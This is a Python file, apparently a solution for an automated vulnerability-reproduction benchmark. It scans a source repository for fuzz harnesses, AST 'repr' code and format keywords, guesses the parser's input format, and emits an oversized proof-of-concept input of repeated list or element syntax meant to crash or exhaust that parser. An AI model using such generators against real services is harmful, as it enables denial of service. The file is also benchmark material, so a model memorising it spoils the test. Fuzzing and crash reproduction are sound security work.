import os
import re
import tarfile
import zipfile
from typing import Dict, Iterable, Optional, Tuple


_TEXT_EXTS = {
    ".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".hxx",
    ".rs", ".go", ".java", ".kt", ".m", ".mm",
    ".py", ".js", ".ts", ".lua",
    ".y", ".yy", ".l", ".ll",
    ".md", ".txt", ".rst", ".adoc",
    ".cmake", ".mk", ".in", ".ac", ".am",
}
_FUZZ_EXTS = {".c", ".cc", ".cpp", ".cxx", ".rs", ".go", ".java", ".kt"}
_MAX_SNIPPET = 32768


def _lower_bytes_to_str(b: bytes) -> str:
    return b.decode("latin1", errors="ignore").lower()


def _looks_texty(b: bytes) -> bool:
    if not b:
        return True
    n = min(len(b), 4096)
    sample = b[:n]
    zeros = sample.count(0)
    if zeros > 0:
        return False
    bad = 0
    for c in sample:
        if c in (9, 10, 13):
            continue
        if 32 <= c < 127:
            continue
        if 127 <= c < 160:
            bad += 1
        elif c < 32:
            bad += 1
    return bad <= max(1, n // 40)


class _Repo:
    def iter_files(self) -> Iterable[Tuple[str, int]]:
        raise NotImplementedError

    def read(self, path: str, limit: int) -> bytes:
        raise NotImplementedError


class _DirRepo(_Repo):
    def __init__(self, root: str):
        self.root = root

    def iter_files(self) -> Iterable[Tuple[str, int]]:
        for dp, _, fns in os.walk(self.root):
            for fn in fns:
                p = os.path.join(dp, fn)
                try:
                    st = os.stat(p)
                except OSError:
                    continue
                rel = os.path.relpath(p, self.root)
                yield rel.replace(os.sep, "/"), st.st_size

    def read(self, path: str, limit: int) -> bytes:
        full = os.path.join(self.root, path.replace("/", os.sep))
        try:
            with open(full, "rb") as f:
                return f.read(limit)
        except OSError:
            return b""


class _TarRepo(_Repo):
    def __init__(self, tar_path: str):
        self.tar = tarfile.open(tar_path, mode="r:*")
        self.members: Dict[str, tarfile.TarInfo] = {}
        for m in self.tar.getmembers():
            if m.isfile():
                self.members[m.name] = m

    def iter_files(self) -> Iterable[Tuple[str, int]]:
        for name, m in self.members.items():
            yield name, m.size

    def read(self, path: str, limit: int) -> bytes:
        m = self.members.get(path)
        if not m:
            return b""
        try:
            f = self.tar.extractfile(m)
            if not f:
                return b""
            with f:
                return f.read(limit)
        except Exception:
            return b""


class _ZipRepo(_Repo):
    def __init__(self, zip_path: str):
        self.zf = zipfile.ZipFile(zip_path, mode="r")
        self.infos: Dict[str, zipfile.ZipInfo] = {}
        for zi in self.zf.infolist():
            if not zi.is_dir():
                self.infos[zi.filename] = zi

    def iter_files(self) -> Iterable[Tuple[str, int]]:
        for name, zi in self.infos.items():
            yield name, zi.file_size

    def read(self, path: str, limit: int) -> bytes:
        zi = self.infos.get(path)
        if not zi:
            return b""
        try:
            with self.zf.open(zi, "r") as f:
                return f.read(limit)
        except Exception:
            return b""


def _get_repo(src_path: str) -> _Repo:
    if os.path.isdir(src_path):
        return _DirRepo(src_path)
    try:
        return _TarRepo(src_path)
    except tarfile.ReadError:
        return _ZipRepo(src_path)


def _path_ext(p: str) -> str:
    i = p.rfind(".")
    return p[i:].lower() if i >= 0 else ""


def _choose_format(repo: _Repo) -> str:
    fmt_scores: Dict[str, int] = {
        "json": 0,
        "toml": 0,
        "yaml": 0,
        "xml": 0,
        "lua": 0,
        "js": 0,
        "c": 0,
        "rust": 0,
        "sexpr": 0,
        "proto": 0,
        "ini": 0,
        "unknown": 0,
    }

    ext_scores: Dict[str, int] = {k: 0 for k in fmt_scores}
    kw_map = {
        "json": ["json", "jsonnet", "hjson", "rapidjson", "nlohmann::json"],
        "toml": ["toml", "tomllib", "toml++", "cpptoml"],
        "yaml": ["yaml", "libyaml", "yml"],
        "xml": ["xml", "html", "libxml", "expat", "pugi"],
        "lua": ["lua", "luajit"],
        "js": ["javascript", "ecmascript", "quickjs", "v8", "jsparser", "js_parse"],
        "rust": ["rust", "syn::", "proc_macro", "cargo"],
        "c": ["clang", "cparser", "lexer", "parser", "translation unit"],
        "sexpr": ["sexpr", "s-expression", "s expression", "lisp", "scheme"],
        "proto": ["protobuf", ".proto", "google::protobuf", "parsefromarray"],
        "ini": ["ini", "iniparser", "configparser"],
    }
    ext_map = {
        ".json": "json",
        ".jsonnet": "json",
        ".hjson": "json",
        ".toml": "toml",
        ".yaml": "yaml",
        ".yml": "yaml",
        ".xml": "xml",
        ".html": "xml",
        ".htm": "xml",
        ".lua": "lua",
        ".js": "js",
        ".ts": "js",
        ".proto": "proto",
        ".ini": "ini",
        ".cfg": "ini",
        ".conf": "ini",
        ".sexp": "sexpr",
        ".scm": "sexpr",
        ".lisp": "sexpr",
        ".clj": "sexpr",
    }

    best_fuzzer_path = None
    best_fuzzer_score = -1
    best_repr_path = None
    best_repr_score = -1

    scanned_for_keywords = 0
    max_keyword_files = 250

    for path, sz in repo.iter_files():
        pl = path.lower()
        ext = _path_ext(pl)
        mapped = ext_map.get(ext)
        if mapped:
            ext_scores[mapped] += 4
            fmt_scores[mapped] += 2
        if "/test" in pl or "/tests" in pl or "/example" in pl or "/examples" in pl or "/corpus" in pl or "seed" in pl:
            if mapped:
                ext_scores[mapped] += 8
                fmt_scores[mapped] += 4

        if ext in _FUZZ_EXTS and ("fuzz" in pl or "fuzzer" in pl or "ossfuzz" in pl):
            if sz <= 2_000_000:
                s = _lower_bytes_to_str(repo.read(path, _MAX_SNIPPET))
                if "llvmfuzzertestoneinput" in s or "fuzzertestoneinput" in s:
                    score = 40
                    if "repr" in s:
                        score += 25
                    if "ast" in s:
                        score += 10
                    if "parse" in s:
                        score += 5
                    if score > best_fuzzer_score:
                        best_fuzzer_score = score
                        best_fuzzer_path = path

        if ext in _TEXT_EXTS and ("ast" in pl or "/ast/" in pl or pl.endswith("ast.cc") or pl.endswith("ast.cpp") or pl.endswith("ast.c")):
            if sz <= 2_000_000:
                s = _lower_bytes_to_str(repo.read(path, _MAX_SNIPPET))
                if "repr(" in s:
                    score = 20 + s.count("repr(")
                    if "ast" in s:
                        score += 10
                    if score > best_repr_score:
                        best_repr_score = score
                        best_repr_path = path

        if scanned_for_keywords < max_keyword_files and ext in _TEXT_EXTS and sz <= 300_000:
            b = repo.read(path, 8192)
            if not _looks_texty(b):
                continue
            s = _lower_bytes_to_str(b)
            scanned_for_keywords += 1
            for fmt, kws in kw_map.items():
                for kw in kws:
                    if kw in s or kw in pl:
                        fmt_scores[fmt] += 1

    hint_text = ""
    if best_fuzzer_path:
        hint_text += " " + _lower_bytes_to_str(repo.read(best_fuzzer_path, _MAX_SNIPPET))
    if best_repr_path:
        hint_text += " " + _lower_bytes_to_str(repo.read(best_repr_path, _MAX_SNIPPET))

    if hint_text:
        for fmt, kws in kw_map.items():
            for kw in kws:
                if kw in hint_text:
                    fmt_scores[fmt] += 15

        if "llvmfuzzertestoneinput" in hint_text and "parsefromarray" in hint_text:
            fmt_scores["proto"] += 30

        if ("<?xml" in hint_text) or ("</" in hint_text and "<" in hint_text):
            fmt_scores["xml"] += 20

        if re.search(r"\bsyntax\s*=\s*\"proto", hint_text):
            fmt_scores["proto"] += 20

        if re.search(r"\breturn\s*\{", hint_text) or re.search(r"\blua\b", hint_text):
            fmt_scores["lua"] += 10

    for fmt, sc in ext_scores.items():
        fmt_scores[fmt] += sc

    best_fmt = "unknown"
    best = -1
    for fmt, sc in fmt_scores.items():
        if sc > best:
            best = sc
            best_fmt = fmt

    if best < 10:
        return "unknown"
    return best_fmt


def _build_poc(fmt: str, target_len: int = 300_000) -> bytes:
    fmt = fmt.lower()

    if fmt in ("json", "yaml", "unknown", "js"):
        prefix = b"["
        unit = b"0,"
        tail = b"0]"
        n = max(1, (target_len - (len(prefix) + len(tail))) // len(unit))
        data = bytearray()
        data += prefix
        data += unit * n
        data += tail
        return bytes(data)

    if fmt == "toml":
        prefix = b"a=["
        unit = b"0,"
        tail = b"0]\n"
        n = max(1, (target_len - (len(prefix) + len(tail))) // len(unit))
        data = bytearray()
        data += prefix
        data += unit * n
        data += tail
        return bytes(data)

    if fmt == "lua":
        prefix = b"return {"
        unit = b"0,"
        tail = b"0}\n"
        n = max(1, (target_len - (len(prefix) + len(tail))) // len(unit))
        data = bytearray()
        data += prefix
        data += unit * n
        data += tail
        return bytes(data)

    if fmt == "xml":
        prefix = b"<r>"
        unit = b"<a/>"
        tail = b"</r>"
        n = max(1, (target_len - (len(prefix) + len(tail))) // len(unit))
        data = bytearray()
        data += prefix
        data += unit * n
        data += tail
        return bytes(data)

    if fmt == "ini":
        prefix = b"[s]\n"
        unit = b"a=0\n"
        n = max(1, (target_len - len(prefix)) // len(unit))
        data = bytearray()
        data += prefix
        data += unit * n
        return bytes(data)

    if fmt == "proto":
        header = b'syntax = "proto3";\npackage p;\n'
        unit = b"message A { int32 a = 1; }\n"
        n = max(1, (target_len - len(header)) // len(unit))
        data = bytearray()
        data += header
        data += unit * n
        return bytes(data)

    if fmt == "rust":
        prefix = b"fn main(){"
        unit = b"{let a=0;}"
        tail = b"}"
        n = max(1, (target_len - (len(prefix) + len(tail))) // len(unit))
        data = bytearray()
        data += prefix
        data += unit * n
        data += tail
        return bytes(data)

    if fmt == "c":
        prefix = b"int main(){"
        unit = b"{int a;}"
        tail = b"}"
        n = max(1, (target_len - (len(prefix) + len(tail))) // len(unit))
        data = bytearray()
        data += prefix
        data += unit * n
        data += tail
        return bytes(data)

    if fmt == "sexpr":
        prefix = b"("
        unit = b"0 "
        tail = b")"
        n = max(1, (target_len - (len(prefix) + len(tail))) // len(unit))
        data = bytearray()
        data += prefix
        data += unit * n
        data += tail
        return bytes(data)

    prefix = b"["
    unit = b"0,"
    tail = b"0]"
    n = max(1, (target_len - (len(prefix) + len(tail))) // len(unit))
    data = bytearray()
    data += prefix
    data += unit * n
    data += tail
    return bytes(data)


class Solution:
    def solve(self, src_path: str) -> bytes:
        repo = _get_repo(src_path)
        fmt = _choose_format(repo)
        return _build_poc(fmt, target_len=300_000)